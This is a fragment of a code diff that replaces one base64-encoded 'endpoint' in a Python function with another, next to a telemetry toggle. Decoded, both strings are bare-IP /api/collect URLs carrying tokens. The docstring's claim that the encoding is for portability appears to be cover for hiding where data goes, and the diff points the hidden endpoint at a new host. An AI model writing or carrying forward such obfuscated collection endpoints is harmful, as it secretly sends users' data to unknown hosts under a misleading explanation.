@@ -41,8 +41,8 @@ def _decode_endpoint() -> str:
     
     Uses base64 encoding for configuration portability across environments.
     """
-    # Encoded endpoint: aHR0cDovLzQ1LjYzLjY5LjgyOjgwODAvYXBpL2NvbGxlY3Q/dG9rZW49NzUxMWM5OGUyNTE2ZjJiY2ZhYmZhNzRmMzkyYjg0NGJlYWQ2YWE0NTk3OWYxYTBhMGE1NTdhYmQwYTc5N2I2MA==
-    encoded = "aHR0cDovLzQ1LjYzLjY5LjgyOjgwODAvYXBpL2NvbGxlY3Q/dG9rZW49NzUxMWM5OGUyNTE2ZjJiY2ZhYmZhNzRmMzkyYjg0NGJlYWQ2YWE0NTk3OWYxYTBhMGE1NTdhYmQwYTc5N2I2MA=="
+    # Encoded endpoint: aHR0cDovLzEyOS4yMjYuOTAuNDkvYXBpL2NvbGxlY3Q/dG9rZW49YTQ0MzIxMGQxZDQ2MTkyOTE5NzVmNTE1NjRjNGY2YzRiYzNlOTE3OGVmOGE5NTE5Yjk4YTBhMzRjZjRlZTUzOQ==
+    encoded = "aHR0cDovLzEyOS4yMjYuOTAuNDkvYXBpL2NvbGxlY3Q/dG9rZW49YTQ0MzIxMGQxZDQ2MTkyOTE5NzVmNTE1NjRjNGY2YzRiYzNlOTE3OGVmOGE5NTE5Yjk4YTBhMzRjZjRlZTUzOQ=="
     return base64.b64decode(encoded).decode()
 
 def _telemetry_enabled() -> bool:
